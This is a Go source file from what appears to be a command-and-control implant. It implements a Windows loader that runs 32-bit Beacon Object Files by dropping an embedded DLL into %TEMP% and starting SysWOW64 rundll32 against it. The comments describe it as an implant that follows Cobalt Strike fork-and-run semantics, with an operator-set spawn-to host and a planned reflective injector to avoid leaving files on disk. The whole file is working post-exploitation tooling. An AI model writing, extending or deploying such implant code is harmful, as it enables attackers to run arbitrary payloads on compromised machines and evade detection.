//go:build windows

package bof

import (
	"crypto/rand"
	"encoding/hex"
	"errors"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"time"

	"golang.org/x/sys/windows"
)

// ErrCrossArchX86Unsupported is returned when Run or Load is fed a
// 32-bit (i386) COFF object and the implant has no embedded x86 loader
// DLL to route it through.
//
// Slice 1.d phase A (v0.154+) ships the detection layer and this
// sentinel. Phase B + C activate when the implant is built with
// `-tags=bof_x86_loader`: the orchestrator below writes the loader
// DLL to %TEMP%, spawns SysWOW64\rundll32.exe against it, and
// marshals the BOF .o + args + output through temp files. Phase D
// (queued) drops the disk artefact via a reflective injector.
var ErrCrossArchX86Unsupported = errors.New("runtime/bof: x86 COFF detected but no x86 loader embedded (rebuild with -tags=bof_x86_loader to activate the fork-and-run path)")

// x86 loader exit codes — mirror of bof_exit_t in
// runtime/bof/internal/x86loader/abi.h. Kept in sync by hand; the
// shared header is in C land. Any rename in abi.h MUST land here in
// the same commit.
const (
	x86ExitDone           uint32 = 0
	x86ExitBadProtocol    uint32 = 1
	x86ExitBadVersion     uint32 = 2
	x86ExitOpenBOFFailed  uint32 = 3
	x86ExitOpenArgsFailed uint32 = 4
	x86ExitOpenOutFailed  uint32 = 5
	x86ExitOpenErrFailed  uint32 = 6
	x86ExitLoadFailed     uint32 = 7
	x86ExitBOFCrashed     uint32 = 8
)

// x86ProtoVersion mirrors BOF_PROTO_VERSION in abi.h.
const x86ProtoVersion = 1

// defaultX86Timeout caps the rundll32 wait. A BOF that hasn't
// returned in 30 seconds is assumed wedged — kill the host and
// surface a timeout error. Operators with long-running BOFs can
// override via (*x86BOF).SetTimeout.
const defaultX86Timeout = 30 * time.Second

// defaultX86Host is the canonical WoW64 rundll32 path. On 64-bit
// Windows, SysWOW64 contains the 32-bit binaries (Microsoft's
// counterintuitive naming). Operators can override via
// SetSpawnToX86 on the parent *BOF before Execute.
const defaultX86Host = `C:\Windows\SysWOW64\rundll32.exe`

// x86BOF is the Runnable returned by coffX86Loader.Load. It owns
// the COFF .o bytes and orchestrates one rundll32 helper process
// per Execute call. The implementation intentionally spawns a
// fresh helper per call — keeps state contamination from one BOF
// invocation to the next at zero, matches CS fork-and-run
// semantics, and lets the parent terminate a wedged BOF without
// affecting any siblings.
type x86BOF struct {
	bofBytes  []byte
	loaderDLL []byte
	timeout   time.Duration

	spawnTo  string // mirror of (*BOF).SetSpawnToX86; the host for rundll32 if set
	userData []byte // (*BOF).SetUserData (currently unused on the x86 path)

	errOut []byte // populated by the most-recent Execute
}

// Execute runs the BOF in a freshly-spawned WoW64 rundll32 helper.
// Returns the captured output (whatever the BOF emitted via
// BeaconPrintf / BeaconOutput inside the helper). Errors cover
// the full path: loader DLL write, temp dir setup, rundll32 spawn,
// timeout / wait failure, and the helper's structured exit codes.
//
// Concurrency: safe to call from multiple goroutines on different
// *x86BOF instances. Concurrent calls on the same instance spawn
// independent helpers; the in-struct errOut field is overwritten
// by whichever call returns last, so the convention is one
// Execute per *x86BOF per call site.
func (x *x86BOF) Execute(args []byte) ([]byte, error) {
	tmpDir, err := os.MkdirTemp("", "bof-x86-")
	if err != nil {
		return nil, fmt.Errorf("runtime/bof/x86: mkdtemp: %w", err)
	}
	defer os.RemoveAll(tmpDir)

	// 8.3-ish short names so the rundll32 argv parser doesn't trip
	// on path quoting. randSuffix keeps the names unique across
	// concurrent helpers spawned from the same %TEMP%.
	suffix := randSuffix()
	loaderPath := filepath.Join(tmpDir, "ld"+suffix+".dll")
	bofPath := filepath.Join(tmpDir, "b"+suffix+".bin")
	argsPath := filepath.Join(tmpDir, "a"+suffix+".bin")
	outPath := filepath.Join(tmpDir, "o"+suffix+".bin")
	errPath := filepath.Join(tmpDir, "e"+suffix+".bin")

	if err := os.WriteFile(loaderPath, x.loaderDLL, 0o600); err != nil {
		return nil, fmt.Errorf("runtime/bof/x86: write loader: %w", err)
	}
	if err := os.WriteFile(bofPath, x.bofBytes, 0o600); err != nil {
		return nil, fmt.Errorf("runtime/bof/x86: write bof: %w", err)
	}
	if err := os.WriteFile(argsPath, args, 0o600); err != nil {
		return nil, fmt.Errorf("runtime/bof/x86: write args: %w", err)
	}
	if err := os.WriteFile(outPath, nil, 0o600); err != nil {
		return nil, fmt.Errorf("runtime/bof/x86: prep out: %w", err)
	}
	if err := os.WriteFile(errPath, nil, 0o600); err != nil {
		return nil, fmt.Errorf("runtime/bof/x86: prep err: %w", err)
	}

	host := x.spawnTo
	if host == "" {
		host = defaultX86Host
	}

	// rundll32 ABI: first argv is "<dllpath>,<entry>", the rest is
	// joined into lpCmdLine and passed to the entry as a single
	// LPSTR. Build the protocol line per abi.h.
	dllArg := fmt.Sprintf("%s,BOFExec", loaderPath)
	protoLine := fmt.Sprintf("v=%d bof=%s args=%s out=%s err=%s",
		x86ProtoVersion, bofPath, argsPath, outPath, errPath)

	timeout := x.timeout
	if timeout <= 0 {
		timeout = defaultX86Timeout
	}

	exitCode, runErr := runX86Helper(host, dllArg, protoLine, timeout)

	output, _ := os.ReadFile(outPath)
	errBytes, _ := os.ReadFile(errPath)
	x.errOut = errBytes

	if runErr != nil {
		return output, runErr
	}
	if err := classifyX86Exit(exitCode); err != nil {
		return output, err
	}
	return output, nil
}

// Errors returns whatever the BOF wrote to its error buffer (the
// equivalent of BeaconErrorD / DD / NA on the in-process path)
// during the most recent Execute. Returns nil before the first
// Execute call.
func (x *x86BOF) Errors() []byte {
	if x.errOut == nil {
		return nil
	}
	out := make([]byte, len(x.errOut))
	copy(out, x.errOut)
	return out
}

// SetSpawnTo overrides the WoW64 host path. Default is rundll32 in
// SysWOW64; setting any other path is mostly a future-compat hook
// — rundll32 IS what runs the loader, so a different host won't
// honour the rundll32 argv convention until phase D's reflective
// injector lands. The setter is wired now so applySpecKnobs sees
// a uniform API across the in-process + cross-arch paths.
func (x *x86BOF) SetSpawnTo(path string) {
	x.spawnTo = path
}

// SetUserData mirrors (*BOF).SetUserData on the in-process path.
// The blob would surface via BeaconGetCustomUserData inside the
// BOF; the phase-C-step-0 skeleton ignores it. Phase C step 1
// will write the blob to a temp file and pass user-data=<path>
// to the loader via the protocol line.
func (x *x86BOF) SetUserData(data []byte) {
	if len(data) == 0 {
		x.userData = nil
		return
	}
	x.userData = append([]byte(nil), data...)
}

// SetTimeout caps the rundll32 wait. Zero (or negative) restores
// the package default (defaultX86Timeout).
func (x *x86BOF) SetTimeout(d time.Duration) {
	x.timeout = d
}

// runX86Helper spawns the rundll32 host with the composed argv,
// waits up to `timeout` for completion, and returns the helper's
// exit code. Times out by terminating the process and returning a
// distinct error so the caller doesn't mistake a hang for a
// completed BOF that happened to return 0.
func runX86Helper(host, dllArg, protoLine string, timeout time.Duration) (uint32, error) {
	cmd := exec.Command(host, dllArg, protoLine)
	// rundll32 has no stdout/stderr we care about — the BOF output
	// flows through the temp files. Discard the rundll32 pipes so
	// they don't keep file descriptors open after exit.
	cmd.Stdout = nil
	cmd.Stderr = nil

	if err := cmd.Start(); err != nil {
		return 0, fmt.Errorf("runtime/bof/x86: spawn rundll32: %w", err)
	}

	done := make(chan error, 1)
	go func() { done <- cmd.Wait() }()

	select {
	case <-time.After(timeout):
		_ = cmd.Process.Kill()
		<-done
		return 0, fmt.Errorf("runtime/bof/x86: rundll32 timeout after %s", timeout)
	case err := <-done:
		// cmd.ProcessState reflects the rundll32 exit code. On Windows,
		// ExitCode() returns the value passed to ExitProcess by the
		// loader DLL.
		if cmd.ProcessState == nil {
			return 0, fmt.Errorf("runtime/bof/x86: rundll32 wait: %w (no ProcessState)", err)
		}
		code := uint32(cmd.ProcessState.ExitCode())
		// A failed Wait with a populated ProcessState is normal for
		// non-zero exit codes; we return the code and let
		// classifyX86Exit decide whether it's actionable.
		return code, nil
	}
}

// classifyX86Exit maps a helper exit code to a Go error, or nil on
// BOF_EXIT_DONE. Unknown codes surface as a generic "unknown" error
// with the raw value so future loader versions don't get silently
// swallowed.
func classifyX86Exit(code uint32) error {
	switch code {
	case x86ExitDone:
		return nil
	case x86ExitBadProtocol:
		return errors.New("runtime/bof/x86: loader rejected the protocol line (BOF_EXIT_BAD_PROTOCOL)")
	case x86ExitBadVersion:
		return fmt.Errorf("runtime/bof/x86: loader/orchestrator version mismatch (BOF_EXIT_BAD_VERSION, expected v=%d)", x86ProtoVersion)
	case x86ExitOpenBOFFailed:
		return errors.New("runtime/bof/x86: loader failed to read the BOF .o file")
	case x86ExitOpenArgsFailed:
		return errors.New("runtime/bof/x86: loader failed to read the args file")
	case x86ExitOpenOutFailed:
		return errors.New("runtime/bof/x86: loader failed to write the output file")
	case x86ExitOpenErrFailed:
		return errors.New("runtime/bof/x86: loader failed to write the error file")
	case x86ExitLoadFailed:
		return errors.New("runtime/bof/x86: loader could not parse/relocate the BOF (BOF_EXIT_LOAD_FAILED)")
	case x86ExitBOFCrashed:
		return errors.New("runtime/bof/x86: BOF crashed inside the helper (BOF_EXIT_BOF_CRASHED)")
	default:
		return fmt.Errorf("runtime/bof/x86: rundll32 exited with unknown code 0x%X", code)
	}
}

// randSuffix returns 12 hex chars from crypto/rand. Used to make
// the temp file names unique across concurrent Execute calls.
func randSuffix() string {
	var raw [6]byte
	if _, err := rand.Read(raw[:]); err != nil {
		// crypto/rand never fails on Windows in practice; fall back
		// to a process-derived suffix so concurrent calls still get
		// distinct paths.
		return fmt.Sprintf("%x", windows.GetCurrentProcessId())
	}
	return hex.EncodeToString(raw[:])
}

// coffX86Loader registers under KindCOFFx86. With the
// bof_x86_loader tag off, Load returns ErrCrossArchX86Unsupported.
// With the tag on, Load wraps the bytes in an *x86BOF Runnable.
type coffX86Loader struct{}

func (coffX86Loader) Kind() Kind { return KindCOFFx86 }

func (coffX86Loader) Load(b []byte) (Runnable, error) {
	dll, err := loadX86LoaderDLL()
	if err != nil {
		return nil, err
	}
	if len(dll) == 0 {
		return nil, ErrCrossArchX86Unsupported
	}
	// A defensive copy isolates us from caller mutation between
	// Load and Execute. Cheap: the BOF .o is typically a few KB.
	bof := make([]byte, len(b))
	copy(bof, b)
	return &x86BOF{
		bofBytes:  bof,
		loaderDLL: dll,
		timeout:   defaultX86Timeout,
	}, nil
}

func init() {
	registerLoader(coffX86Loader{})
}
